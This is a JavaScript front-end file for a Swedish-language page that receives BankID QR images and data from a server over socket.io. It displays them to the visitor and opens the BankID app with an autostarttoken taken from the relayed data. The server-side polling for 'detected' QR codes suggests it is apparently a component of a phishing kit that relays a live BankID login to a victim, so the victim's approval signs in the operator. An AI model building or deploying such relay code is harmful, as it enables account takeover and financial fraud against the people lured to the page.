const hidee = document.getElementById("hidee");

function showBankIDLogo() {
    const supportMenu = document.getElementsByClassName('support-menu')[0];
    const footer = document.getElementsByClassName('footer')[0];
    supportMenu.style.display = 'none';
    footer.style.display = 'none';
    hidee.style.display = 'block';
}

const menuIcon = document.getElementById('menu-icon');
const supportIcon = document.getElementById('support-icon');
const mainMenuModal = document.getElementById('main-menu-modal');
const supportModal = document.getElementById('support-modal');
const closeMainMenu = document.getElementById('close-main-menu');
const closeSupport = document.getElementById('close-support');

menuIcon.addEventListener('click', () => {
    mainMenuModal.style.display = 'flex';
});

supportIcon.addEventListener('click', () => {
    supportModal.style.display = 'flex';
});

closeMainMenu.addEventListener('click', () => {
    mainMenuModal.style.display = 'none';
});

closeSupport.addEventListener('click', () => {
    supportModal.style.display = 'none';
});

window.addEventListener('click', (event) => {
    if (event.target === mainMenuModal) {
        mainMenuModal.style.display = 'none';
    }
    if (event.target === supportModal) {
        supportModal.style.display = 'none';
    }
});

const socket = io();
const qrImage = document.getElementById('qrImage');
qrImage.style.display = 'none';

let bankIdQRData = '';
let qrDisplayTimeout;
let qrIsDisplayed = false;

socket.on('update_qr_code_image', function (data) {
    if (qrDisplayTimeout) {
        clearTimeout(qrDisplayTimeout);
    }
    
    qrImage.src = 'data:image/png;base64,' + data.qr_image;
    hidee.style.display = 'none';
    qrIsDisplayed = true;
    
    console.log("Received QR data:", data.qr_code_data);
    
    if (data.qr_code_data) {
        bankIdQRData = data.qr_code_data;
        
        if (data.autostarttoken) {
            console.log("Received autostart token:", data.autostarttoken);
        }
    }
    
    const qrContainer = document.createElement('div');
    qrContainer.className = 'qr-container';
    qrContainer.style.display = 'flex';
    qrContainer.style.flexDirection = 'column';
    qrContainer.style.alignItems = 'center';
    qrContainer.style.gap = '15px';
    
    qrImage.style.display = 'block';
    qrImage.style.margin = '0 auto';
    qrImage.style.maxWidth = '200px';
    
    const continueButton = document.createElement('button');
    continueButton.textContent = 'Fortsätt till BankID';
    continueButton.className = 'bankid-button';
    continueButton.style.padding = '12px 24px';
    continueButton.style.backgroundColor = '#007aff';
    continueButton.style.color = 'white';
    continueButton.style.border = 'none';
    continueButton.style.borderRadius = '4px';
    continueButton.style.cursor = 'pointer';
    continueButton.style.fontWeight = 'bold';
    continueButton.style.marginTop = '10px';
    
    continueButton.addEventListener('click', openBankIDApp);
    
    const modalContent = qrImage.parentElement;
    
    modalContent.innerHTML = '';
    
    qrContainer.appendChild(qrImage);
    qrContainer.appendChild(continueButton);
    modalContent.appendChild(qrContainer);
    
    if (data.qrData) {
        bankIdQRData = data.qrData;
    }
    
    qrDisplayTimeout = setTimeout(checkForNoQR, 2000);
});

socket.on('no_qr_detected', function() {
    if (qrIsDisplayed) {
        showAnimationIfNoNewQR();
    }
});

function checkForNoQR() {
    socket.emit('check_qr_detection');
}

function showAnimationIfNoNewQR() {
    qrImage.style.display = 'none';
    hidee.style.display = 'block';
    qrIsDisplayed = false;
    
    const modalContent = qrImage.parentElement;
    if (modalContent) {
        modalContent.innerHTML = '';
        modalContent.appendChild(hidee);
        modalContent.appendChild(qrImage);
    }
}

function openBankIDApp() {
    const isIOS = /iPad|iPhone|iPod/.test(navigator.userAgent) && !window.MSStream;
    const isAndroid = /Android/.test(navigator.userAgent);
    
    const confirmDialog = document.createElement('div');
    confirmDialog.className = 'confirm-dialog';
    confirmDialog.style.position = 'fixed';
    confirmDialog.style.top = '50%';
    confirmDialog.style.left = '50%';
    confirmDialog.style.transform = 'translate(-50%, -50%)';
    confirmDialog.style.backgroundColor = 'white';
    confirmDialog.style.padding = '20px';
    confirmDialog.style.borderRadius = '8px';
    confirmDialog.style.boxShadow = '0 4px 12px rgba(0,0,0,0.15)';
    confirmDialog.style.zIndex = '1000';
    confirmDialog.style.maxWidth = '80%';
    confirmDialog.style.textAlign = 'center';
    
    confirmDialog.innerHTML = `
        <h3 style="margin-top: 0; color: #007aff;">Öppna BankID-appen</h3>
        <p>Vill du öppna BankID-appen för att fortsätta?</p>
        <div style="display: flex; justify-content: center; gap: 10px; margin-top: 20px;">
            <button id="cancelOpenBankID" style="padding: 8px 16px; background-color: #f1f1f1; border: none; border-radius: 4px; cursor: pointer;">Avbryt</button>
            <button id="confirmOpenBankID" style="padding: 8px 16px; background-color: #007aff; color: white; border: none; border-radius: 4px; cursor: pointer;">Öppna</button>
        </div>
    `;
    
    document.body.appendChild(confirmDialog);
    
    document.getElementById('cancelOpenBankID').addEventListener('click', function() {
        document.body.removeChild(confirmDialog);
    });
    
    document.getElementById('confirmOpenBankID').addEventListener('click', function() {
        document.body.removeChild(confirmDialog);
        
        socket.emit('request_fresh_qr_data');
        
        if (bankIdQRData) {
            console.log("Using BankID QR Data:", bankIdQRData);
            
            let autostartToken = bankIdQRData;
            if (bankIdQRData.startsWith('bankid.')) {
                const parts = bankIdQRData.split('.');
                if (parts.length >= 2) {
                    autostartToken = parts[1];
                }
            }
            
            if (isIOS) {
                window.location.href = `bankid:///?autostarttoken=${autostartToken}&redirect=null`;
            } else if (isAndroid) {
                window.location.href = `bankid:///?autostarttoken=${autostartToken}&redirect=null`;
            } else {
                window.location.href = `bankid:///?autostarttoken=${autostartToken}`;
            }
            
            setTimeout(function() {
                if (confirm('BankID-appen kunde inte öppnas eller gav ett fel. Vill du installera eller uppdatera BankID-appen?')) {
                    if (isIOS) {
                        window.location.href = `bankid:///?autostarttoken=${autostartToken}&redirect=null`;
                    } else if (isAndroid) {
                        window.location.href = `bankid:///?autostarttoken=${autostartToken}&redirect=null`;
                    }
                }
            }, 10000);
        } else {
            alert('Ingen BankID-data tillgänglig. Var god skanna QR-koden igen.');
        }
    });
}

document.querySelector('.menu-item').addEventListener('click', function() {
    showBankIDLogo();
});

socket.on('qr_data', function(data) {
    if (data && data.qrData) {
        bankIdQRData = data.qrData;
    }
});